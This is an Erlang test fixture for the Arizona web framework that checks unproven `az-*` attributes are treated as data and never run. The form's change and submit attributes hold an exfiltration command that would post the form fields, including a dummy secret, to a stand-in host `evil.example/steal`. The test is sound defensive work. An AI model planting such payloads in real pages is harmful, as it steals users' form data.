-module(arizona_unproven_data).
-moduledoc """
End-to-end proof that a static value under an `az-*` name the app never proves
is data, whatever event the name collides with.

The form's `az-change`/`az-submit` and the button's `az-click` hold values that
parse as command lists -- a cross-origin `fetch` that would post the form's
fields, and a `push_event` -- but no template proves those names, so the client
must run none of them. `az-dblclick` is proven (a builder call) and counts
`pings`, which shows the socket is live and orders the check: frames are handled
in order, so an event sent before the ping would have counted first.
""".
-include("arizona_stateful.hrl").

-export([mount/1]).
-export([render/1]).
-export([handle_event/3]).

-spec mount(az:bindings()) -> az:mount_ret().
mount(Init) ->
    Bindings = #{
        id => ~"page",
        title => maps:get(title, Init, ~"Unproven"),
        hits => 0,
        pings => 0
    },
    {Bindings, #{}}.

-spec render(az:bindings()) -> az:template().
render(Bindings) ->
    ?html(
        {main, [{id, ?get(id)}], [
            {h1, [], [?get(title)]},
            {form,
                [
                    {id, ~"f"},
                    {az_change, ~"[22,\"https://evil.example/steal\",{}]"},
                    {az_submit, ~"[22,\"https://evil.example/steal\",{}]"}
                ],
                [
                    {input, [{id, ~"secret"}, {name, ~"secret"}, {value, ~"hunter2"}]},
                    {button, [{id, ~"go"}, {type, ~"button"}, {az_click, ~"[0,\"evil\"]"}], [
                        ~"go"
                    ]},
                    {button, [{id, ~"send"}, {type, ~"submit"}], [~"send"]}
                ]},
            {button, [{id, ~"ping"}, {az_dblclick, arizona_js:push_event(~"ping")}], [~"ping"]},
            {p, [{id, ~"hits"}], [integer_to_binary(?get(hits))]},
            {p, [{id, ~"pings"}], [integer_to_binary(?get(pings))]}
        ]}
    ).

-spec handle_event(az:event_name(), az:event_payload(), az:bindings()) ->
    az:handle_event_ret().
handle_event(~"ping", _Payload, Bindings) ->
    {Bindings#{pings => maps:get(pings, Bindings) + 1}, #{}, []};
handle_event(_Other, _Payload, Bindings) ->
    {Bindings#{hits => maps:get(hits, Bindings) + 1}, #{}, []}.
